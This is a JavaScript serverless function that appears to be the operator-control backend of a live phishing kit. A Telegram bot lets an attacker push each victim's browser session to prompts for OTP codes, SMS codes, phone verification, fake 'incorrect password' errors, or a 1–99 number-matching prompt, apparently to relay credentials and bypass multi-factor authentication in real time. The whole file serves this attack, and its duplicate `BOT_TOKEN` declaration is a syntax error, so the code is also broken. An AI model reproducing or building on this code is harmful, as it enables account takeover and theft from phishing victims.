// poll-session.js
// Browser calls this every second. It does two things:
// 1. Asks Telegram for any new button clicks (getUpdates)
// 2. Returns the session status from Supabase

import { dbSelectOne, dbUpdate, dbUpsert } from './_supabase.js';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

const COMMAND_MAP = {
  otp:       'otp_required',
  sms:       'sms_code',
  phone:     'phone_verification',
  success:   'success',
  incorrect: 'incorrect_password',
  sua:       'sua',
};

// Offset stored in Supabase so it persists across function instances
const OFFSET_TABLE = 'telegram_offset';

export const handler = async (event) => {
  if (event.httpMethod !== 'GET') {
    return { statusCode: 405, body: 'Method not allowed' };
  }

  const sessionId = event.queryStringParameters?.sessionId;
  if (!sessionId) return ok({ status: 'waiting' });

  try {
    // Step 1: Fetch and process any pending Telegram button clicks
    await processTelegramUpdates();

    // Step 2: Read session status from Supabase
    const row = await dbSelectOne('sessions', { id: sessionId }, 'status,response_type,email');
    if (!row) return ok({ status: 'waiting' });

    return ok({
      status:       row.status,
      responseType: row.response_type,
      email:        row.email,
    });
  } catch (e) {
    console.error('poll-session error:', e.message);
    return ok({ status: 'waiting', error: e.message });
  }
};

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

function buildOriginalKeyboard(sessionId) {
  return { inline_keyboard: [
    [{ text:'🔑 OTP Prompt',    callback_data:`otp_${sessionId}` },      { text:'❌ Password Error', callback_data:`incorrect_${sessionId}` }],
    [{ text:'📱 SMS Code',      callback_data:`sms_${sessionId}` },       { text:'📞 Phone Number',   callback_data:`phone_${sessionId}` }],
    [{ text:'🔢 Number Prompt', callback_data:`np_${sessionId}` }],
    [{ text:'✅ Success',       callback_data:`success_${sessionId}` },   { text:'⚠️ SUA',            callback_data:`sua_${sessionId}` }],
  ]};
}

function buildNumberGrid(sessionId) {
  const rows = [];
  let row = [];
  for (let i = 1; i <= 99; i++) {
    row.push({ text: String(i), callback_data: `n${i}_${sessionId}` });
    if (row.length === 8) { rows.push(row); row = []; }
  }
  if (row.length) rows.push(row);
  rows.push([{ text: '← Back', callback_data: `back_${sessionId}` }]);
  return { inline_keyboard: rows };
}

async function editKeyboard(chatId, messageId, reply_markup) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup }),
      signal: AbortSignal.timeout(5000),
    });
  } catch (e) { console.error('editKeyboard error:', e.message); }
}

async function processTelegramUpdates() {
  // Get current offset from Supabase
  const offsetRow = await dbSelectOne('telegram_offset', { id: 1 }, 'offset_value').catch(() => null);
  const offset    = offsetRow?.offset_value || 0;

  // Call Telegram getUpdates
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10&timeout=0&offset=${offset}&allowed_updates=["callback_query"]`;

  const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
  if (!r.ok) {
    console.error('getUpdates failed:', r.status);
    return;
  }

  const data = await r.json();
  if (!data.ok || !data.result?.length) return;

  console.log(`Processing ${data.result.length} Telegram update(s)`);

  let maxUpdateId = offset - 1;

  for (const update of data.result) {
    maxUpdateId = Math.max(maxUpdateId, update.update_id);

    if (!update.callback_query) continue;

    const cb     = update.callback_query;
    const cbId   = cb.id;
    const cbData = cb.data || '';

    console.log('callback_query:', cbData);

    // Regex: letters + optional digits (handles np, n67, back, otp, etc.)
    const match = cbData.match(/^([a-z]+\d*)_([a-f0-9]{32})$/);
    if (!match) { console.error('Regex no match:', cbData); continue; }

    const action    = match[1];
    const sessionId = match[2];
    const msgId     = update.callback_query.message?.message_id;
    const chatId    = update.callback_query.message?.chat?.id;

    // Show number grid
    if (action === 'np') {
      if (msgId && chatId) await editKeyboard(chatId, msgId, buildNumberGrid(sessionId));
      await answerCallback(cbId, 'Select a number'); continue;
    }

    // Back to original keyboard
    if (action === 'back') {
      if (msgId && chatId) await editKeyboard(chatId, msgId, buildOriginalKeyboard(sessionId));
      await answerCallback(cbId, '← Back'); continue;
    }

    // Number selected (n1–n99)
    if (/^n\d+$/.test(action)) {
      const number = action.substring(1);
      await dbUpdate('sessions', {
        status: 'responded', response_type: `number_prompt:${number}`,
        responded_at: new Date().toISOString(), last_update: new Date().toISOString(),
      }, { id: sessionId });
      if (msgId && chatId) await editKeyboard(chatId, msgId, buildOriginalKeyboard(sessionId));
      console.log(`Session ${sessionId} → number_prompt:${number}`);
      await answerCallback(cbId, `✅ Number ${number} sent`); continue;
    }

    // Standard action
    const responseType = COMMAND_MAP[action];
    if (!responseType) { console.error('Unknown action:', action); continue; }

    await dbUpdate('sessions', {
      status: 'responded', response_type: responseType,
      responded_at: new Date().toISOString(), last_update: new Date().toISOString(),
    }, { id: sessionId });
    console.log(`Session ${sessionId} → ${responseType}`);
    await answerCallback(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
  }

  // Advance offset so we don't process same updates again
  const newOffset = maxUpdateId + 1;
  try {
    await dbUpsert('telegram_offset', { id: 1, offset_value: newOffset });
  } catch (e) {
    console.error('CRITICAL: offset save failed — telegram_offset table may not exist:', e.message);
  }
}


async function answerCallback(cbId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ callback_query_id: cbId, text }),
      signal:  AbortSignal.timeout(5000),
    });
  } catch (e) {
    console.error('answerCallback error:', e.message);
  }
}

const ok = (b) => ({
  statusCode: 200,
  headers:    { 'Content-Type': 'application/json' },
  body:       JSON.stringify(b),
});
